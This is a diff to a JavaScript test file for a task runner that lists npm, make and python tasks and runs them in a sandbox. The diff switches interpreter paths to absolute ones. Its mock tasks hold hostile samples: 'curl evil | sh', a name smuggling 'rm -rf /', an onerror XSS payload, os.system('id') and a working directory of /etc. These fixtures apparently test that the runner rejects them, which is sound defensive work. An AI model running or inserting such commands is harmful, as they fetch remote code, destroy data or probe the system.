@@ -13,7 +13,8 @@ import { tmp } from './helpers.mjs';
 
 const SECRET = 'ab'.repeat(16);
 const calls = [];
-const npmTest = { source: 'npm', name: 'test', argv: ['npm', 'run', '--', 'test'], cwd: '.', command: 'npm run -- test',
+const NPM = ['/usr/local/bin/node', '/usr/local/lib/node_modules/npm/bin/npm-cli.js'];
+const npmTest = { source: 'npm', name: 'test', argv: [...NPM, 'run', '--', 'test'], cwd: '.', command: 'npm run -- test',
   detail: [{ name: 'pretest', text: 'tsc' }, { name: 'test', text: 'vitest run' }], files: [{ path: '.npmrc', sha256: 'e'.repeat(64) }],
   notes: ['The workspace\'s .npmrc is read first'], digest: 'ignored: the code container computes its own' };
 const answers = {
@@ -22,13 +23,13 @@ const answers = {
       { source: 'shell', file: 'x' }, 'junk'],
     tasks: [npmTest,
       { ...npmTest, name: 'sneaky', argv: ['sh', '-c', 'curl evil | sh'] },
-      { ...npmTest, name: 'a; rm -rf /', argv: ['npm', 'run', '--', 'a; rm -rf /'] },
+      { ...npmTest, name: 'a; rm -rf /', argv: [...NPM, 'run', '--', 'a; rm -rf /'] },
       { source: 'npm', name: '<img src=x onerror=alert(1)>', error: 'not a name the Run menu passes on' },
-      { source: 'make', name: 'check', argv: ['make', '--', 'check'], cwd: '.', command: 'make -- check', detail: [{ name: 'Makefile: check', text: 'pytest -q' }],
+      { source: 'make', name: 'check', argv: ['/usr/bin/make', '--', 'check'], cwd: '.', command: 'make -- check', detail: [{ name: 'Makefile: check', text: 'pytest -q' }],
         files: [{ path: 'Makefile', sha256: 'f'.repeat(64) }], notes: [7, 'Makefile includes other files'] },
-      { source: 'python', name: 'hello', argv: ['python3', '-c', PY_LOADER, 'hello', 'app.cli:main'], cwd: '.', command: 'python3 -c …', detail: [{ name: 'pyproject.toml', text: 'hello = "app.cli:main"' }] },
-      { source: 'python', name: 'evil', argv: ['python3', '-c', 'import os; os.system("id")', 'evil', 'a:b'], cwd: '.', detail: [{ name: 'x', text: 'y' }] },
-      { source: 'make', name: 'far', argv: ['make', '--', 'far'], cwd: '/etc', detail: [{ name: 'x', text: 'y' }] },
+      { source: 'python', name: 'hello', argv: ['/usr/bin/python3.13', '-I', '-c', PY_LOADER, 'hello', 'app.cli:main'], cwd: '.', command: 'python3 -c …', detail: [{ name: 'pyproject.toml', text: 'hello = "app.cli:main"' }] },
+      { source: 'python', name: 'evil', argv: ['/usr/bin/python3', '-I', '-c', 'import os; os.system("id")', 'evil', 'a:b'], cwd: '.', detail: [{ name: 'x', text: 'y' }] },
+      { source: 'make', name: 'far', argv: ['/usr/bin/make', '--', 'far'], cwd: '/etc', detail: [{ name: 'x', text: 'y' }] },
       { source: 'shell', name: 'x' }, null, 'junk'] } }),
   'run.start': (req) => (req.digest === 'c'.repeat(64) ? Promise.reject(new SandboxError('the task changed since it was shown: review it again', 'refused'))
     : { result: { ok: true, id: '0123456789abcdef', window: '@12', source: req.source, name: req.name, command: 'npm run -- test' } }),
